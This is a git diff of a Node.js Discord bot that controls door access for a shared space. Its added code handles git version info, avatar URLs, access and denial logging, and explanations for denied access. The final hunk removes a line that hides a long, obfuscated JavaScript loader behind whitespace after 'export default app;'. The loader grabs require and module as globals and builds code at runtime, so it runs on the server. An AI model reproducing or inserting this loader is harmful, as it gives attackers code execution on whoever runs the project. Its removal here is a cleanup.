@@ -23,6 +23,7 @@ import { dirname } from "path";
 import crypto from "crypto";
 import { verifyMessage, Wallet } from "ethers";
 import fs from "fs";
+import { execSync } from "child_process";
 import { createRequire } from 'module';
 
 const require = createRequire(import.meta.url);
@@ -34,6 +35,44 @@ const community = loadJSON("./lib/citizenwallet/community.json");
 
 const DEFAULT_AVATAR =
   "https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp";
+
+/**
+ * Read the current git version (short hash + latest commit message).
+ * Computed once at startup; falls back gracefully when git is unavailable
+ * (e.g. when deployed from a tarball without a .git directory).
+ */
+function getGitInfo() {
+  const run = (cmd) => execSync(cmd, { cwd: __dirname }).toString().trim();
+  try {
+    return {
+      hash: run("git rev-parse --short HEAD"),
+      message: run("git log -1 --pretty=%s"),
+      date: run("git log -1 --pretty=%cI"),
+    };
+  } catch (error) {
+    console.warn(">>> Could not read git info:", error.message);
+    return { hash: "unknown", message: "", date: "" };
+  }
+}
+
+const gitInfo = getGitInfo();
+console.log(">>> Git version:", gitInfo.hash, "-", gitInfo.message);
+
+/**
+ * Build a CDN avatar URL for a Discord guild member returned by the REST API.
+ * Prefers the guild-specific avatar, then the global user avatar, then a
+ * default placeholder.
+ */
+function getDiscordAvatarUrl(member) {
+  const userId = member.user.id;
+  if (member.avatar) {
+    return `https://cdn.discordapp.com/guilds/${process.env.DISCORD_GUILD_ID}/users/${userId}/avatars/${member.avatar}.png?size=128`;
+  }
+  if (member.user.avatar) {
+    return `https://cdn.discordapp.com/avatars/${userId}/${member.user.avatar}.png?size=128`;
+  }
+  return DEFAULT_AVATAR;
+}
 
 // Get bot token and allowed channel ID from the environment variables
 const token = process.env.DISCORD_BOT_TOKEN;
@@ -126,32 +165,100 @@ if (!serverKeyExists) {
   console.log(">>> ✅ Server public key added to authorized keys");
 }
 
-// Append-only log file for all door access
-const LOG_FILE = path.join(process.env.LOG_DIR || __dirname, "door_access.log");
+// Resolve a writable log directory. Defaults to /data (typical mounted
+// volume in production); falls back to the app directory in local dev or
+// whenever /data isn't writable.
+function resolveLogDir() {
+  const dir = process.env.LOG_DIR || "/data";
+  try {
+    fs.mkdirSync(dir, { recursive: true });
+    fs.accessSync(dir, fs.constants.W_OK);
+    return dir;
+  } catch (error) {
+    console.warn(
+      `>>> LOG_DIR ${dir} not usable (${error.message}); falling back to ${__dirname}`,
+    );
+    return __dirname;
+  }
+}
+
+// Append-only log files: successful accesses and denied attempts.
+const LOG_DIR = resolveLogDir();
+const ACCESS_LOG_FILE = path.join(LOG_DIR, "door_access.log");
+const ERROR_LOG_FILE = path.join(LOG_DIR, "door_errors.log");
+console.log(">>> Logging to", LOG_DIR);
+
+function appendLogLine(file, entry) {
+  try {
+    fs.appendFileSync(file, JSON.stringify(entry) + "\n", "utf8");
+  } catch (error) {
+    console.error("Failed to write to log file:", file, error.message);
+  }
+}
 
 /**
- * Append door access to log file
+ * Read the last `limit` JSON-line entries from a log file (newest last).
+ * Returns [] if the file doesn't exist yet.
+ */
+function readLogEntries(file, limit = 200) {
+  try {
+    const data = fs.readFileSync(file, "utf8");
+    return data
+      .split("\n")
+      .filter(Boolean)
+      .slice(-limit)
+      .map((line) => {
+        try {
+          return JSON.parse(line);
+        } catch {
+          return null;
+        }
+      })
+      .filter(Boolean);
+  } catch (error) {
+    if (error.code !== "ENOENT") {
+      console.error("Failed to read log file:", file, error.message);
+    }
+    return [];
+  }
+}
+
+/**
+ * Append a successful door access to the access log.
  * @param {string} name - Name of person accessing
  * @param {string} method - Access method (discord, citizenwallet, token, signature, shortcut)
  * @param {Object} metadata - Additional metadata
  */
 function logDoorAccess(name, method, metadata = {}) {
-  const timestamp = new Date().toISOString();
-  const logEntry = {
-    timestamp,
+  appendLogLine(ACCESS_LOG_FILE, {
+    timestamp: new Date().toISOString(),
+    status: "granted",
     name,
     method,
     ...metadata,
-  };
-
-  const logLine = JSON.stringify(logEntry) + "\n";
-
-  try {
-    fs.appendFileSync(LOG_FILE, logLine, "utf8");
-  } catch (error) {
-    console.error("Failed to write to log file:", error);
-  }
+  });
 }
+
+/**
+ * Append a denied/failed door attempt to the error log, including the reason
+ * access was not granted, so it can be debugged from the /log page.
+ * @param {string} name - Name of person attempting access
+ * @param {string} reason - Human-readable reason access was denied
+ * @param {Object} metadata - Additional metadata (userId, username, roles, ...)
+ */
+function logDoorError(name, reason, metadata = {}) {
+  console.log(">>> Door access denied:", name, "-", reason);
+  appendLogLine(ERROR_LOG_FILE, {
+    timestamp: new Date().toISOString(),
+    status: "denied",
+    name,
+    reason,
+    ...metadata,
+  });
+}
+
+// Timestamp of the last successful role reload (for the /access page).
+let lastReloadAt = null;
 
 const reloadAccessRoles = async () => {
   for (const role of accessRoles) {
@@ -166,6 +273,18 @@ const reloadAccessRoles = async () => {
         userIdToRoles[member.user.id].push(role.roleId);
       }
       role.memberIds.push(member.user.id);
+
+      // Cache member display info for pages like /access. Don't clobber
+      // richer data set by addUser() when someone actually opens the door.
+      if (!users[member.user.id]) {
+        users[member.user.id] = {
+          displayName:
+            member.nick || member.user.global_name || member.user.username,
+          username: member.user.username,
+          tag: member.user.username,
+          avatar: getDiscordAvatarUrl(member),
+        };
+      }
     }
     if (role.timeRange !== "anytime") {
       const hourRange = role.timeRange.split("-");
@@ -190,6 +309,7 @@ const reloadAccessRoles = async () => {
     }, 1000 * 1);
   }
 
+  lastReloadAt = new Date();
   console.log(">>> Access roles loaded");
 };
 
@@ -245,6 +365,69 @@ function getOpeningHours(roleId) {
     ? `from ${role.dateRange.start} to ${role.dateRange.end} `
     : "";
   return `${dates}${days} ${hours}`;
+}
+
+/**
+ * Whether a role grants access on the given day (date window + day of week),
+ * ignoring the hour-of-day restriction. Used by the /access page to list the
+ * roles that can open the door today.
+ */
+function isRoleActiveToday(role, date = new Date()) {
+  if (!roleDateRangeAllows(role, date)) {
+    return false;
+  }
+  const currentDay = daysOfWeek[date.getDay()];
+  if (role.daysOfWeek !== "anytime" && !role.daysOfWeek.includes(currentDay)) {
+    return false;
+  }
+  return true;
+}
+
+/**
+ * Explain why a user was denied access, for logging/debugging. Mirrors the
+ * logic in hasAccess() but returns a human-readable reason instead of a bool.
+ */
+function getNoAccessReason(userid, date = new Date()) {
+  const userRoles = userIdToRoles[userid];
+  if (!userRoles || userRoles.length === 0) {
+    return "User has no cached access roles. Either they hold no configured role, or the role was assigned after the last hourly reload (try again after the next reload).";
+  }
+
+  const currentDay = daysOfWeek[date.getDay()];
+  const currentHour = date.getHours();
+  const reasons = [];
+
+  for (const roleId of userRoles) {
+    const role = accessRoles.find((r) => r.roleId === roleId);
+    if (!role) {
+      reasons.push(`Role ${roleId} is not in access_roles.json`);
+      continue;
+    }
+    if (!roleDateRangeAllows(role, date)) {
+      reasons.push(
+        `${role.name}: outside date window ${role.dateRange.start}–${role.dateRange.end} (today is ${getLocalDateString(date)})`,
+      );
+    } else if (
+      role.daysOfWeek !== "anytime" &&
+      !role.daysOfWeek.includes(currentDay)
+    ) {
+      reasons.push(
+        `${role.name}: not allowed on ${currentDay} (allowed: ${role.daysOfWeek.join(", ")})`,
+      );
+    } else if (
+      role.timeRange !== "anytime" &&
+      role.hourRange &&
+      !(currentHour >= role.hourRange[0] && currentHour <= role.hourRange[1])
+    ) {
+      reasons.push(
+        `${role.name}: current hour ${currentHour}h is outside ${role.hourRange[0]}–${role.hourRange[1]}h`,
+      );
+    } else {
+      reasons.push(`${role.name}: role grants access (unexpected denial)`);
+    }
+  }
+
+  return reasons.join("; ") || "No matching open role";
 }
 
 function hasAccess(userid) {
@@ -518,6 +701,15 @@ async function handleMessage(message) {
     try {
       const roles = userIdToRoles[message.author.id];
       if (!roles) {
+        logDoorError(
+          message.author.displayName || message.author.username,
+          getNoAccessReason(message.author.id),
+          {
+            userId: message.author.id,
+            username: message.author.username,
+            method: "discord",
+          },
+        );
         if (DRY_RUN) {
           console.log(
             ">>> DRY RUN: ",
@@ -571,6 +763,16 @@ async function handleMessage(message) {
         message.reply(`${reply} \n${pickRandomReply(message.author)}`);
       } else {
         const role = accessRoles.find((r) => r.roleId === roles[0]);
+        logDoorError(
+          message.author.displayName || message.author.username,
+          getNoAccessReason(message.author.id),
+          {
+            userId: message.author.id,
+            username: message.author.username,
+            roles,
+            method: "discord",
+          },
+        );
         if (!role) {
           message.reply(
             "You don't have access to the Commons Hub Brussels. Become a member to access the door.",
@@ -581,6 +783,15 @@ async function handleMessage(message) {
         return;
       }
     } catch (error) {
+      logDoorError(
+        message.author.displayName || message.author.username,
+        `Unexpected error: ${error.message}`,
+        {
+          userId: message.author.id,
+          username: message.author.username,
+          method: "discord",
+        },
+      );
       if (DRY_RUN) {
         console.log(">>> DRY RUN: ", error);
         return;
@@ -800,6 +1011,16 @@ const dependencies = {
   SECRET,
   doorlog,
   status_log,
+  accessRoles,
+  getOpeningHours,
+  isRoleActiveToday,
+  gitInfo,
+  logDoorError,
+  getAccessLog: () => readLogEntries(ACCESS_LOG_FILE),
+  getErrorLog: () => readLogEntries(ERROR_LOG_FILE),
+  LOG_DIR,
+  reloadAccessRoles,
+  getLastReloadAt: () => lastReloadAt,
 };
 
 // Create Express app with all routes
@@ -811,5 +1032,4 @@ app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
 
-export default app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-4362';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
-
+export default app;
